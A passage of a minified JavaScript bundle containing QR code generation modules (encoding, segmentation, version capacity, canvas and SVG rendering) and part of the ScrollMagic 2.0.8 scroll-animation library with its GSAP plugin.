r,i,a=e.size,o=h.getEncodedBits(t,n);for(r=0;r<15;r++)i=1==(o>>r&1),r<6?e.set(r,8,i,!0):r<8?e.set(r+1,8,i,!0):e.set(a-15+r,8,i,!0),r<8?e.set(8,a-r-1,i,!0):r<9?e.set(8,15-r-1+1,i,!0):e.set(8,15-r-1,i,!0);e.set(a-8,8,1,!0)}function v(e,t,n){var i=new a;n.forEach((function(t){i.put(t.mode.bit,4),i.put(t.getLength(),f.getCharCountIndicator(t.mode,e)),t.write(i)}));var o=8*(r.getSymbolTotalCodewords(e)-u.getTotalCodewordsCount(e,t));for(i.getLengthInBits()+4<=o&&i.put(0,4);i.getLengthInBits()%8!=0;)i.putBit(0);for(var s=(o-i.getLengthInBits())/8,l=0;l<s;l++)i.put(l%2?17:236,8);return function(e,t,n){for(var i=r.getSymbolTotalCodewords(t),a=i-u.getTotalCodewordsCount(t,n),o=u.getBlocksCount(t,n),s=o-i%o,l=Math.floor(i/o),c=Math.floor(a/o),p=c+1,h=l-c,f=new d(h),A=0,m=new Array(o),v=new Array(o),g=0,y=new Uint8Array(e.buffer),b=0;b<o;b++){var _=b<s?c:p;m[b]=y.slice(A,A+_),v[b]=f.encode(m[b]),A+=_,g=Math.max(g,_)}var w,C,x=new Uint8Array(i),S=0;for(w=0;w<g;w++)for(C=0;C<o;C++)w<m[C].length&&(x[S++]=m[C][w]);for(w=0;w<h;w++)for(C=0;C<o;C++)x[S++]=v[C][w];return x}(i,e,t)}n.create=function(e,t){if(void 0===e||""===e)throw new Error("No input text");var n,a,u=i.M;return void 0!==t&&(u=i.from(t.errorCorrectionLevel,i.M),n=p.from(t.version),a=c.from(t.maskPattern),t.toSJISFunc&&r.setToSJISFunction(t.toSJISFunc)),function(e,t,n,i){var a;if(Array.isArray(e))a=A.fromArray(e);else{if("string"!=typeof e)throw new Error("Invalid data");var u=t;if(!u){var d=A.rawSplit(e);u=p.getBestVersionForData(d,n)}a=A.fromString(e,u||40)}var h=p.getBestVersionForData(a,n);if(!h)throw new Error("The amount of data is too big to be stored in a QR Code");if(t){if(t<h)throw new Error("\nThe chosen QR Code version cannot contain this amount of data.\nMinimum version required to store current data is: "+h+".\n")}else t=h;var f=v(t,n,a),g=r.getSymbolSize(t),y=new o(g);return function(e,t){for(var n=e.size,r=l.getPositions(t),i=0;i<r.length;i++)for(var a=r[i][0],o=r[i][1],s=-1;s<=7;s++)if(!(a+s<=-1||n<=a+s))for(var c=-1;c<=7;c++)o+c<=-1||n<=o+c||(0<=s&&s<=6&&(0===c||6===c)||0<=c&&c<=6&&(0===s||6===s)||2<=s&&s<=4&&2<=c&&c<=4?e.set(a+s,o+c,!0,!0):e.set(a+s,o+c,!1,!0))}(y,t),function(e){for(var t=e.size,n=8;n<t-8;n++){var r=n%2==0;e.set(n,6,r,!0),e.set(6,n,r,!0)}}(y),function(e,t){for(var n=s.getPositions(t),r=0;r<n.length;r++)for(var i=n[r][0],a=n[r][1],o=-2;o<=2;o++)for(var l=-2;l<=2;l++)-2===o||2===o||-2===l||2===l||0===o&&0===l?e.set(i+o,a+l,!0,!0):e.set(i+o,a+l,!1,!0)}(y,t),m(y,n,0),7<=t&&function(e,t){for(var n,r,i,a=e.size,o=p.getEncodedBits(t),s=0;s<18;s++)n=Math.floor(s/3),r=s%3+a-8-3,i=1==(o>>s&1),e.set(n,r,i,!0),e.set(r,n,i,!0)}(y,t),function(e,t){for(var n=e.size,r=-1,i=n-1,a=7,o=0,s=n-1;0<s;s-=2)for(6===s&&s--;;){for(var l=0;l<2;l++)if(!e.isReserved(i,s-l)){var c=!1;o<t.length&&(c=1==(t[o]>>>a&1)),e.set(i,s-l,c),-1==--a&&(o++,a=7)}if((i+=r)<0||n<=i){i-=r,r=-r;break}}}(y,f),isNaN(i)&&(i=c.getBestMask(y,m.bind(null,y,n))),c.applyMask(i,y),m(y,n,i),{modules:y,version:t,errorCorrectionLevel:n,maskPattern:i,segments:a}}(e,n,u,a)}},{"./alignment-pattern":240,"./bit-buffer":242,"./bit-matrix":243,"./error-correction-code":245,"./error-correction-level":246,"./finder-pattern":247,"./format-info":248,"./mask-pattern":251,"./mode":252,"./reed-solomon-encoder":256,"./segments":258,"./utils":259,"./version":261}],256:[function(e,t,n){var r=e("./polynomial");function i(e){this.genPoly=void 0,this.degree=e,this.degree&&this.initialize(this.degree)}i.prototype.initialize=function(e){this.degree=e,this.genPoly=r.generateECPolynomial(this.degree)},i.prototype.encode=function(e){if(!this.genPoly)throw new Error("Encoder not initialized");var t=new Uint8Array(e.length+this.degree);t.set(e);var n=r.mod(t,this.genPoly),i=this.degree-n.length;if(0<i){var a=new Uint8Array(this.degree);return a.set(n,i),a}return n},t.exports=i},{"./polynomial":254}],257:[function(e,t,n){var r="(?:[u3000-u303F]|[u3040-u309F]|[u30A0-u30FF]|[uFF00-uFFEF]|[u4E00-u9FAF]|[u2605-u2606]|[u2190-u2195]|u203B|[u2010u2015u2018u2019u2025u2026u201Cu201Du2225u2260]|[u0391-u0451]|[u00A7u00A8u00B1u00B4u00D7u00F7])+",i="(?:(?![A-Z0-9 $%*+\\-./:]|"+(r=r.replace(/u/g,"\\u"))+")(?:.|[\r\n]))+";n.KANJI=new RegExp(r,"g"),n.BYTE_KANJI=new RegExp("[^A-Z0-9 $%*+\\-./:]+","g"),n.BYTE=new RegExp(i,"g"),n.NUMERIC=new RegExp("[0-9]+","g"),n.ALPHANUMERIC=new RegExp("[A-Z $%*+\\-./:]+","g");var a=new RegExp("^"+r+"$"),o=new RegExp("^[0-9]+$"),s=new RegExp("^[A-Z0-9 $%*+\\-./:]+$");n.testKanji=function(e){return a.test(e)},n.testNumeric=function(e){return o.test(e)},n.testAlphanumeric=function(e){return s.test(e)}},{}],258:[function(e,t,n){var r=e("./mode"),i=e("./numeric-data"),a=e("./alphanumeric-data"),o=e("./byte-data"),s=e("./kanji-data"),l=e("./regex"),c=e("./utils"),u=e("dijkstrajs");function d(e){return unescape(encodeURIComponent(e)).length}function p(e,t,n){for(var r,i=[];null!==(r=e.exec(n));)i.push({data:r[0],index:r.index,mode:t,length:r[0].length});return i}function h(e){var t,n,i=p(l.NUMERIC,r.NUMERIC,e),a=p(l.ALPHANUMERIC,r.ALPHANUMERIC,e);return n=c.isKanjiModeEnabled()?(t=p(l.BYTE,r.BYTE,e),p(l.KANJI,r.KANJI,e)):(t=p(l.BYTE_KANJI,r.BYTE,e),[]),i.concat(a,t,n).sort((function(e,t){return e.index-t.index})).map((function(e){return{data:e.data,mode:e.mode,length:e.length}}))}function f(e,t){switch(t){case r.NUMERIC:return i.getBitsLength(e);case r.ALPHANUMERIC:return a.getBitsLength(e);case r.KANJI:return s.getBitsLength(e);case r.BYTE:return o.getBitsLength(e)}}function A(e,t){var n,l=r.getBestModeForData(e);if((n=r.from(t,l))!==r.BYTE&&n.bit<l.bit)throw new Error('"'+e+'" cannot be encoded with mode '+r.toString(n)+".\n Suggested mode is: "+r.toString(l));switch(n!==r.KANJI||c.isKanjiModeEnabled()||(n=r.BYTE),n){case r.NUMERIC:return new i(e);case r.ALPHANUMERIC:return new a(e);case r.KANJI:return new s(e);case r.BYTE:return new o(e)}}n.fromArray=function(e){return e.reduce((function(e,t){return"string"==typeof t?e.push(A(t,null)):t.data&&e.push(A(t.data,t.mode)),e}),[])},n.fromString=function(e,t){for(var i=function(e,t){for(var n={},i={start:{}},a=["start"],o=0;o<e.length;o++){for(var s=e[o],l=[],c=0;c<s.length;c++){var u=s[c],d=""+o+c;l.push(d),n[d]={node:u,lastCount:0},i[d]={};for(var p=0;p<a.length;p++){var h=a[p];n[h]&&n[h].node.mode===u.mode?(i[h][d]=f(n[h].lastCount+u.length,u.mode)-f(n[h].lastCount,u.mode),n[h].lastCount+=u.length):(n[h]&&(n[h].lastCount=u.length),i[h][d]=f(u.length,u.mode)+4+r.getCharCountIndicator(u.mode,t))}}a=l}for(var A=0;A<a.length;A++)i[a[A]].end=0;return{map:i,table:n}}(function(e){for(var t=[],n=0;n<e.length;n++){var i=e[n];switch(i.mode){case r.NUMERIC:t.push([i,{data:i.data,mode:r.ALPHANUMERIC,length:i.length},{data:i.data,mode:r.BYTE,length:i.length}]);break;case r.ALPHANUMERIC:t.push([i,{data:i.data,mode:r.BYTE,length:i.length}]);break;case r.KANJI:t.push([i,{data:i.data,mode:r.BYTE,length:d(i.data)}]);break;case r.BYTE:t.push([{data:i.data,mode:r.BYTE,length:d(i.data)}])}}return t}(h(e,c.isKanjiModeEnabled())),t),a=u.find_path(i.map,"start","end"),o=[],s=1;s<a.length-1;s++)o.push(i.table[a[s]].node);return n.fromArray(o.reduce((function(e,t){var n=0<=e.length-1?e[e.length-1]:null;return n&&n.mode===t.mode?e[e.length-1].data+=t.data:e.push(t),e}),[]))},n.rawSplit=function(e){return n.fromArray(h(e,c.isKanjiModeEnabled()))}},{"./alphanumeric-data":241,"./byte-data":244,"./kanji-data":250,"./mode":252,"./numeric-data":253,"./regex":257,"./utils":259,dijkstrajs:37}],259:[function(e,t,n){var r,i=[0,26,44,70,100,134,172,196,242,292,346,404,466,532,581,655,733,815,901,991,1085,1156,1258,1364,1474,1588,1706,1828,1921,2051,2185,2323,2465,2611,2761,2876,3034,3196,3362,3532,3706];n.getSymbolSize=function(e){if(!e)throw new Error('"version" cannot be null or undefined');if(e<1||40<e)throw new Error('"version" should be in range from 1 to 40');return 4*e+17},n.getSymbolTotalCodewords=function(e){return i[e]},n.getBCHDigit=function(e){for(var t=0;0!==e;)t++,e>>>=1;return t},n.setToSJISFunction=function(e){if("function"!=typeof e)throw new Error('"toSJISFunc" is not a valid function.');r=e},n.isKanjiModeEnabled=function(){return void 0!==r},n.toSJIS=function(e){return r(e)}},{}],260:[function(e,t,n){n.isValid=function(e){return!isNaN(e)&&1<=e&&e<=40}},{}],261:[function(e,t,n){var r=e("./utils"),i=e("./error-correction-code"),a=e("./error-correction-level"),o=e("./mode"),s=e("./version-check"),l=r.getBCHDigit(7973);function c(e,t){return o.getCharCountIndicator(e,t)+4}function u(e,t){var n=0;return e.forEach((function(e){var r=c(e.mode,t);n+=r+e.getBitsLength()})),n}n.from=function(e,t){return s.isValid(e)?parseInt(e,10):t},n.getCapacity=function(e,t,n){if(!s.isValid(e))throw new Error("Invalid QR Code version");void 0===n&&(n=o.BYTE);var a=8*(r.getSymbolTotalCodewords(e)-i.getTotalCodewordsCount(e,t));if(n===o.MIXED)return a;var l=a-c(n,e);switch(n){case o.NUMERIC:return Math.floor(l/10*3);case o.ALPHANUMERIC:return Math.floor(l/11*2);case o.KANJI:return Math.floor(l/13);case o.BYTE:default:return Math.floor(l/8)}},n.getBestVersionForData=function(e,t){var r,i=a.from(t,a.M);if(Array.isArray(e)){if(1<e.length)return function(e,t){for(var r=1;r<=40;r++)if(u(e,r)<=n.getCapacity(r,t,o.MIXED))return r}(e,i);if(0===e.length)return 1;r=e[0]}else r=e;return function(e,t,r){for(var i=1;i<=40;i++)if(t<=n.getCapacity(i,r,e))return i}(r.mode,r.getLength(),i)},n.getEncodedBits=function(e){if(!s.isValid(e)||e<7)throw new Error("Invalid QR Code version");for(var t=e<<12;0<=r.getBCHDigit(t)-l;)t^=7973<<r.getBCHDigit(t)-l;return e<<12|t}},{"./error-correction-code":245,"./error-correction-level":246,"./mode":252,"./utils":259,"./version-check":260}],262:[function(e,t,n){var r=e("./utils");n.render=function(e,t,n){var i=n,a=t;void 0!==i||t&&t.getContext||(i=t,t=void 0),t||(a=function(){try{return document.createElement("canvas")}catch(e){throw new Error("You need to specify a canvas element")}}()),i=r.getOptions(i);var o,s,l=r.getImageWidth(e.modules.size,i),c=a.getContext("2d"),u=c.createImageData(l,l);return r.qrToImageData(u.data,e,i),o=a,s=l,c.clearRect(0,0,o.width,o.height),o.style||(o.style={}),o.height=s,o.width=s,o.style.height=s+"px",o.style.width=s+"px",c.putImageData(u,0,0),a},n.renderToDataURL=function(e,t,r){var i=r;void 0!==i||t&&t.getContext||(i=t,t=void 0),i||(i={});var a=n.render(e,t,i),o=i.type||"image/png",s=i.rendererOpts||{};return a.toDataURL(o,s.quality)}},{"./utils":264}],263:[function(e,t,n){var r=e("./utils");function i(e,t){var n=e.a/255,r=t+'="'+e.hex+'"';return n<1?r+" "+t+'-opacity="'+n.toFixed(2).slice(1)+'"':r}function a(e,t,n){var r=e+t;return void 0!==n&&(r+=" "+n),r}n.render=function(e,t,n){var o=r.getOptions(t),s=e.modules.size,l=e.modules.data,c=s+2*o.margin,u=o.color.light.a?"<path "+i(o.color.light,"fill")+' d="M0 0h'+c+"v"+c+'H0z"/>':"",d="<path "+i(o.color.dark,"stroke")+' d="'+function(e,t,n){for(var r="",i=0,o=!1,s=0,l=0;l<e.length;l++){var c=Math.floor(l%t),u=Math.floor(l/t);c||o||(o=!0),e[l]?(s++,0<l&&0<c&&e[l-1]||(r+=o?a("M",c+n,.5+u+n):a("m",i,0),i=0,o=!1),c+1<t&&e[l+1]||(r+=a("h",s),s=0)):i++}return r}(l,s,o.margin)+'"/>',p='viewBox="0 0 '+c+" "+c+'"',h='<svg xmlns="http://www.w3.org/2000/svg" '+(o.width?'width="'+o.width+'" height="'+o.width+'" ':"")+p+' shape-rendering="crispEdges">'+u+d+"</svg>\n";return"function"==typeof n&&n(null,h),h}},{"./utils":264}],264:[function(e,t,n){function r(e){if("number"==typeof e&&(e=e.toString()),"string"!=typeof e)throw new Error("Color should be defined as hex string");var t=e.slice().replace("#","").split("");if(t.length<3||5===t.length||8<t.length)throw new Error("Invalid hex color: "+e);3!==t.length&&4!==t.length||(t=Array.prototype.concat.apply([],t.map((function(e){return[e,e]})))),6===t.length&&t.push("F","F");var n=parseInt(t.join(""),16);return{r:n>>24&255,g:n>>16&255,b:n>>8&255,a:255&n,hex:"#"+t.slice(0,6).join("")}}n.getOptions=function(e){e||(e={}),e.color||(e.color={});var t=void 0===e.margin||null===e.margin||e.margin<0?4:e.margin,n=e.width&&21<=e.width?e.width:void 0,i=e.scale||4;return{width:n,scale:n?4:i,margin:t,color:{dark:r(e.color.dark||"#000000ff"),light:r(e.color.light||"#ffffffff")},type:e.type,rendererOpts:e.rendererOpts||{}}},n.getScale=function(e,t){return t.width&&t.width>=e+2*t.margin?t.width/(e+2*t.margin):t.scale},n.getImageWidth=function(e,t){var r=n.getScale(e,t);return Math.floor((e+2*t.margin)*r)},n.qrToImageData=function(e,t,r){for(var i=t.modules.size,a=t.modules.data,o=n.getScale(i,r),s=Math.floor((i+2*r.margin)*o),l=r.margin*o,c=[r.color.light,r.color.dark],u=0;u<s;u++)for(var d=0;d<s;d++){var p=4*(u*s+d),h=r.color.light;l<=u&&l<=d&&u<s-l&&d<s-l&&(h=c[a[Math.floor((u-l)/o)*i+Math.floor((d-l)/o)]?1:0]),e[p++]=h.r,e[p++]=h.g,e[p++]=h.b,e[p]=h.a}}},{}],265:[function(e,t,n){t.exports={ScrollMagicPluginGsap:function(e,t,n){var r=t,i="animation.gsap",a=window.console||{},o=Function.prototype.bind.call(a.error||a.log||function(){},a);e||o("("+i+") -> ERROR: The ScrollMagic main module could not be found. Please make sure it's loaded before this plugin or use an asynchronous loader like requirejs."),r||o("("+i+") -> ERROR: TweenLite or TweenMax could not be found. Please make sure GSAP is loaded before ScrollMagic or use an asynchronous loader like requirejs."),e.Scene.addOption("tweenChanges",!1,(function(e){return!!e})),e.Scene.extend((function(){var e,t=this,a=function(){t._log&&(Array.prototype.splice.call(arguments,1,0,"("+i+")","->"),t._log.apply(this,arguments))};t.on("progress.plugin_gsap",(function(){o()})),t.on("destroy.plugin_gsap",(function(e){t.removeTween(e.reset)}));var o=function(){if(e){var n=t.progress(),r=t.state();e.repeat&&-1===e.repeat()?"DURING"===r&&e.paused()?e.play():"DURING"===r||e.paused()||e.pause():n!=e.progress()&&(0===t.duration()?0<n?e.play():e.reverse():t.tweenChanges()&&e.tweenTo?e.tweenTo(n*e.duration()):e.progress(n).pause())}};t.setTween=function(i,s,l){var c;1<arguments.length&&(arguments.length<3&&(l=s,s=1),i=r.to(i,s,l));try{(c=n?new n({smoothChildTiming:!0}).add(i):i).pause()}catch(i){return a(1,"ERROR calling method 'setTween()': Supplied argument is not a valid TweenObject"),t}if(e&&t.removeTween(),e=c,i.repeat&&-1===i.repeat()&&(e.repeat(-1),e.yoyo(i.yoyo())),t.tweenChanges()&&!e.tweenTo&&a(2,"WARNING: tweenChanges will only work if the TimelineMax object is available for ScrollMagic."),e&&t.controller()&&t.triggerElement()&&2<=t.loglevel()){var u=r.getTweensOf(t.triggerElement()),d=t.controller().info("vertical");u.forEach((function(e,t){var n=e.vars.css||e.vars;if(d?void 0!==n.top||void 0!==n.bottom:void 0!==n.left||void 0!==n.right)return a(2,"WARNING: Tweening the position of the trigger element affects the scene timing and should be avoided!"),!1}))}if(1.14<=parseFloat(r.version))for(var p,h,f=e.getChildren?e.getChildren(!0,!0,!1):[e],A=function(){a(2,"WARNING: tween was overwritten by another. To learn how to avoid this issue see here: https://github.com/janpaepke/ScrollMagic/wiki/WARNING:-tween-was-overwritten-by-another")},m=0;m<f.length;m++)p=f[m],h!==A&&(h=p.vars.onOverwrite,p.vars.onOverwrite=function(){h&&h.apply(this,arguments),A.apply(this,arguments)});return a(3,"added tween"),o(),t},t.removeTween=function(n){return e&&(n&&e.progress(0).pause(),e.kill(),e=void 0,a(3,"removed tween (reset: "+(n?"true":"false")+")")),t}}))}}},{}],266:[function(e,t,n){var r;r=function(){var e=function(){i.log(2,"(COMPATIBILITY NOTICE) -> As of ScrollMagic 2.0.0 you need to use 'new ScrollMagic.Controller()' to create a new controller instance. Use 'new ScrollMagic.Scene()' to instance a scene.")};e.version="2.0.8","undefined"!=typeof window&&window.addEventListener("mousewheel",void 0);var t="data-scrollmagic-pin-spacer";e.Controller=function(r){var a,o,s="ScrollMagic.Controller",l=n.defaults,c=this,u=i.extend({},l,r),d=[],p=!1,h=0,f="PAUSED",A=!0,m=0,v=!0,g=function(){0<u.refreshInterval&&(o=window.setTimeout(S,u.refreshInterval))},y=function(){return u.vertical?i.get.scrollTop(u.container):i.get.scrollLeft(u.container)},b=function(){return u.vertical?i.get.height(u.container):i.get.width(u.container)},_=this._setScrollPos=function(e){u.vertical?A?window.scrollTo(i.get.scrollLeft(),e):u.container.scrollTop=e:A?window.scrollTo(e,i.get.scrollTop()):u.container.scrollLeft=e},w=function(){if(v&&p){var e=i.type.Array(p)?p:d.slice(0);p=!1;var t=h,n=(h=c.scrollPos())-t;0!==n&&(f=0<n?"FORWARD":"REVERSE"),"REVERSE"===f&&e.reverse(),e.forEach((function(t,n){k(3,"updating Scene "+(n+1)+"/"+e.length+" ("+d.length+" total)"),t.update(!0)})),0===e.length&&3<=u.loglevel&&k(3,"updating 0 Scenes (nothing added to controller)")}},C=function(){a=i.rAF(w)},x=function(e){k(3,"event fired causing an update:",e.type),"resize"==e.type&&(m=b(),f="PAUSED"),!0!==p&&(p=!0,C())},S=function(){if(!A&&m!=b()){var e;try{e=new Event("resize",{bubbles:!1,cancelable:!1})}catch(t){(e=document.createEvent("Event")).initEvent("resize",!1,!1)}u.container.dispatchEvent(e)}d.forEach((function(e,t){e.refresh()})),g()},k=this._log=function(e,t){u.loglevel>=e&&(Array.prototype.splice.call(arguments,1,0,"("+s+") ->"),i.log.apply(window,arguments))};this._options=u;var M=function(e){if(e.length<=1)return e;var t=e.slice(0);return t.sort((function(e,t){return e.scrollOffset()>t.scrollOffset()?1:-1})),t};return this.addScene=function(t){if(i.type.Array(t))t.forEach((function(e,t){c.addScene(e)}));else if(t instanceof e.Scene){if(t.controller()!==c)t.addTo(c);else if(d.indexOf(t)<0){for(var n in d.push(t),d=M(d),t.on("shift.controller_sort",(function(){d=M(d)})),u.globalSceneOptions)t[n]&&t[n].call(t,u.globalSceneOptions[n]);k(3,"adding Scene (now "+d.length+" total)")}}else k(1,"ERROR: invalid argument supplied for '.addScene()'");return c},this.removeScene=function(e){if(i.type.Array(e))e.forEach((function(e,t){c.removeScene(e)}));else{var t=d.indexOf(e);-1<t&&(e.off("shift.controller_sort"),d.splice(t,1),k(3,"removing Scene (now "+d.length+" left)"),e.remove())}return c},this.updateScene=function(t,n){return i.type.Array(t)?t.forEach((function(e,t){c.updateScene(e,n)})):n?t.update(!0):!0!==p&&t instanceof e.Scene&&(-1==(p=p||[]).indexOf(t)&&p.push(t),p=M(p),C()),c},this.update=function(e){return x({type:"resize"}),e&&w(),c},this.scrollTo=function(n,r){if(i.type.Number(n))_.call(u.container,n,r);else if(n instanceof e.Scene)n.controller()===c?c.scrollTo(n.scrollOffset(),r):k(2,"scrollTo(): The supplied scene does not belong to this controller. Scroll cancelled.",n);else if(i.type.Function(n))_=n;else{var a=i.get.elements(n)[0];if(a){for(;a.parentNode.hasAttribute(t);)a=a.parentNode;var o=u.vertical?"top":"left",s=i.get.offset(u.container),l=i.get.offset(a);A||(s[o]-=c.scrollPos()),c.scrollTo(l[o]-s[o],r)}else k(2,"scrollTo(): The supplied argument is invalid. Scroll cancelled.",n)}return c},this.scrollPos=function(e){return arguments.length?(i.type.Function(e)?y=e:k(2,"Provided value for method 'scrollPos' is not a function. To change the current scroll position use 'scrollTo()'."),c):y.call(c)},this.info=function(e){var t={size:m,vertical:u.vertical,scrollPos:h,scrollDirection:f,container:u.container,isDocument:A};return arguments.length?void 0!==t[e]?t[e]:void k(1,'ERROR: option "'+e+'" is not available'):t},this.loglevel=function(e){return arguments.length?(u.loglevel!=e&&(u.loglevel=e),c):u.loglevel},this.enabled=function(e){return arguments.length?(v!=e&&(v=!!e,c.updateScene(d,!0)),c):v},this.destroy=function(e){window.clearTimeout(o);for(var t=d.length;t--;)d[t].destroy(e);return u.container.removeEventListener("resize",x),u.container.removeEventListener("scroll",x),i.cAF(a),k(3,"destroyed "+s+" (reset: "+(e?"true":"false")+")"),null},function(){for(var t in u)l.hasOwnProperty(t)||(k(2,'WARNING: Unknown option "'+t+'"'),delete u[t]);if(u.container=i.get.elements(u.container)[0],!u.container)throw k(1,"ERROR creating object "+s+": No valid scroll container supplied"),s+" init failed.";(A=u.container===window||u.container===document.body||!document.body.contains(u.container))&&(u.container=window),m=b(),u.container.addEventListener("resize",x),u.container.addEventListener("scroll",x);var n=parseInt(u.refreshInterval,10);u.refreshInterval=i.type.Number(n)?n:l.refreshInterval,g(),k(3,"added new "+s+" controller (v"+e.version+")")}(),c};var n={defaults:{container:window,vertical:!0,globalSceneOptions:{},loglevel:2,refreshInterval:100}};e.Controller.addOption=function(e,t){n.defaults[e]=t},e.Controller.extend=function(t){var n=this;e.Controller=function(){return n.apply(this,arguments),this.$super=i.extend({},this),t.apply(this,arguments)||this},i.extend(e.Controller,n),e.Controller.prototype=n.prototype,e.Controller.prototype.constructor=e.Controller},e.Scene=function(n){var a,o,s="ScrollMagic.Scene",l="BEFORE",c="DURING",u="AFTER",d=r.defaults,p=this,h=i.extend({},d,n),f=l,A=0,m={start:0,end:0},v=0,g=!0,y={};this.on=function(e,t){return i.type.Function(t)?(e=e.trim().split(" ")).forEach((function(e){var n=e.split("."),r=n[0],i=n[1];"*"!=r&&(y[r]||(y[r]=[]),y[r].push({namespace:i||"",callback:t}))})):b(1,"ERROR when calling '.on()': Supplied callback for '"+e+"' is not a valid function!"),p},this.off=function(e,t){return e?(e=e.trim().split(" ")).forEach((function(e,n){var r=e.split("."),i=r[0],a=r[1]||"";("*"===i?Object.keys(y):[i]).forEach((function(e){for(var n=y[e]||[],r=n.length;r--;){var i=n[r];!i||a!==i.namespace&&"*"!==a||t&&t!=i.callback||n.splice(r,1)}n.length||delete y[e]}))})):b(1,"ERROR: Invalid event name supplied."),p},this.trigger=function(t,n){if(t){var r=t.trim().split("."),i=r[0],a=r[1],o=y[i];b(3,"event fired:",i,n?"->":"",n||""),o&&o.forEach((function(t,r){a&&a!==t.namespace||t.callback.call(p,new e.Event(i,t.namespace,p,n))}))}else b(1,"ERROR: Invalid event name supplied.");return p},p.on("change.internal",(function(e){"loglevel"!==e.what&&"tweenChanges"!==e.what&&("triggerElement"===e.what?S():"reverse"===e.what&&p.update())})).on("shift.internal",(function(e){C(),p.update()}));var b=this._log=function(e,t){h.loglevel>=e&&(Array.prototype.splice.call(arguments,1,0,"("+s+") ->"),i.log.apply(window,arguments))};this.addTo=function(t){return t instanceof e.Controller?o!=t&&(o&&o.removeScene(p),o=t,B(),x(!0),S(!0),C(),o.info("container").addEventListener("resize",k),t.addScene(p),p.trigger("add",{controller:o}),b(3,"added "+s+" to controller"),p.update()):b(1,"ERROR: supplied argument of 'addTo()' is not a valid ScrollMagic Controller"),p},this.enabled=function(e){return arguments.length?(g!=e&&(g=!!e,p.update(!0)),p):g},this.remove=function(){if(o){o.info("container").removeEventListener("resize",k);var e=o;o=void 0,e.removeScene(p),p.trigger("remove"),b(3,"removed "+s+" from controller")}return p},this.destroy=function(e){return p.trigger("destroy",{reset:e}),p.remove(),p.off("*.*"),b(3,"destroyed "+s+" (reset: "+(e?"true":"false")+")"),null},this.update=function(e){if(o)if(e)if(o.enabled()&&g){var t,n=o.info("scrollPos");t=0<h.duration?(n-m.start)/(m.end-m.start):n>=m.start?1:0,p.trigger("update",{startPos:m.start,endPos:m.end,scrollPos:n}),p.progress(t)}else _&&f===c&&P(!0);else o.updateScene(p,!1);return p},this.refresh=function(){return x(),S(),p},this.progress=function(e){if(arguments.length){var t=!1,n=f,r=o?o.info("scrollDirection"):"PAUSED",i=h.reverse||A<=e;if(0===h.duration?(t=A!=e,f=0==(A=e<1&&i?0:1)?l:c):e<0&&f!==l&&i?(f=l,t=!(A=0)):0<=e&&e<1&&i?(A=e,f=c,t=!0):1<=e&&f!==u?(A=1,f=u,t=!0):f!==c||i||P(),t){var a={progress:A,state:f,scrollDirection:r},s=f!=n,d=function(e){p.trigger(e,a)};s&&n!==c&&(d("enter"),d(n===l?"start":"end")),d("progress"),s&&f!==c&&(d(f===l?"start":"end"),d("leave"))}return p}return A};var _,w,C=function(){m={start:v+h.offset},o&&h.triggerElement&&(m.start-=o.info("size")*h.triggerHook),m.end=m.start+h.duration},x=function(e){if(a){var t="duration";E(t,a.call(p))&&!e&&(p.trigger("change",{what:t,newval:h[t]}),p.trigger("shift",{reason:t}))}},S=function(e){var n=0,r=h.triggerElement;if(o&&(r||0<v)){if(r)if(r.parentNode){for(var a=o.info(),s=i.get.offset(a.container),l=a.vertical?"top":"left";r.parentNode.hasAttribute(t);)r=r.parentNode;var c=i.get.offset(r);a.isDocument||(s[l]-=o.scrollPos()),n=c[l]-s[l]}else b(2,"WARNING: triggerElement was removed from DOM and will be reset to",void 0),p.triggerElement(void 0);var u=n!=v;v=n,u&&!e&&p.trigger("shift",{reason:"triggerElementPosition"})}},k=function(e){0<h.triggerHook&&p.trigger("shift",{reason:"containerResize"})},M=i.extend(r.validate,{duration:function(e){if(i.type.String(e)&&e.match(/^(\.|\d)*\d+%$/)){var t=parseFloat(e)/100;e=function(){return o?o.info("size")*t:0}}if(i.type.Function(e)){a=e;try{e=parseFloat(a.call(p))}catch(t){e=-1}}if(e=parseFloat(e),!i.type.Number(e)||e<0)throw a?(a=void 0,['Invalid return value of supplied function for option "duration":',e]):['Invalid value for option "duration":',e];return e}}),B=function(e){(e=arguments.length?[e]:Object.keys(M)).forEach((function(e,t){var n;if(M[e])try{n=M[e](h[e])}catch(t){n=d[e];var r=i.type.String(t)?[t]:t;i.type.Array(r)?(r[0]="ERROR: "+r[0],r.unshift(1),b.apply(this,r)):b(1,"ERROR: Problem executing validation callback for option '"+e+"':",t.message)}finally{h[e]=n}}))},E=function(e,t){var n=!1,r=h[e];return h[e]!=t&&(h[e]=t,B(e),n=r!=h[e]),n},T=function(e){p[e]||(p[e]=function(t){return arguments.length?("duration"===e&&(a=void 0),E(e,t)&&(p.trigger("change",{what:e,newval:h[e]}),-1<r.shifts.indexOf(e)&&p.trigger("shift",{reason:e})),p):h[e]})};this.controller=function(){return o},this.state=function(){return f},this.scrollOffset=function(){return m.start},this.triggerPosition=function(){var e=h.offset;return o&&(h.triggerElement?e+=v:e+=o.info("size")*p.triggerHook()),e},p.on("shift.internal",(function(e){var t="duration"===e.reason;(f===u&&t||f===c&&0===h.duration)&&P(),t&&I()})).on("progress.internal",(function(e){P()})).on("add.internal",(function(e){I()})).on("destroy.internal",(function(e){p.removePin(e.reset)}));var P=function(e){if(_&&o){var t=o.info(),n=w.spacer.firstChild;if(e||f!==c){var r={position:w.inFlow?"relative":"absolute",top:0,left:0},a=i.css(n,"position")!=r.position;w.pushFollowers?0<h.duration&&(f===u&&0===parseFloat(i.css(w.spacer,"padding-top"))||f===l&&0===parseFloat(i.css(w.spacer,"padding-bottom")))&&(a=!0):r[t.vertical?"top":"left"]=h.duration*A,i.css(n,r),a&&I()}else{"fixed"!=i.css(n,"position")&&(i.css(n,{position:"fixed"}),I());var s=i.get.offset(w.spacer,!0),d=h.reverse||0===h.duration?t.scrollPos-m.start:Math.round(A*h.duration*10)/10;s[t.vertical?"top":"left"]+=d,i.css(w.spacer.firstChild,{top:s.top,left:s.left})}}},I=function(){if(_&&o&&w.inFlow){var 